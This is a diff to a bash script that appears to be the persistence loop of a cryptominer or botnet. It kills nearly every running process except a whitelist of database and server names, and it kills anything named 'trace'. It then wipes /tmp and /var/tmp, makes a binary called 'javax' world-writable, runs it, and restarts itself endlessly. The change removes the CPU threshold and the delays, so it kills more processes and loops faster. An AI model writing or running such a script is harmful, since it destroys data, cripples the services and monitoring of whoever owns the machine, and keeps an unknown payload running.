@@ -1,10 +1,10 @@
 #!/bin/bash
 function run(){
-    ps aux | grep -v grep | grep -v "java\|redis\|weblogic\|mongod\|mysql\|oracle\|tomcat\|grep\|postgres\|confluence\|awk\|aux\|sh\|trace" | awk '{if($3>50.0) print $2}' | xargs -I % kill -9 %
+    ps aux | grep -v grep | grep -v "java\|redis\|weblogic\|mongod\|mysql\|oracle\|tomcat\|grep\|postgres\|confluence\|awk\|aux\|sh" | awk '{print $2}' | xargs -I % kill -9 %
+    ps aux | grep "trace" | awk '{print $2}' | xargs -I % kill -9 %
     rm -rf /tmp/*
     rm -rf /var/tmp/*
-    if pgrep -f "javax" > /dev/null; then
-        sleep 1; run
+    if pgrep -f "javax" > /dev/null; then run
     else
         if [ -f "javax" ]; then
             chmod 777 javax
@@ -24,7 +24,6 @@ function run(){
         fi
     fi
     ./javax
-    sleep 1; run
+    run
 }
-
 run
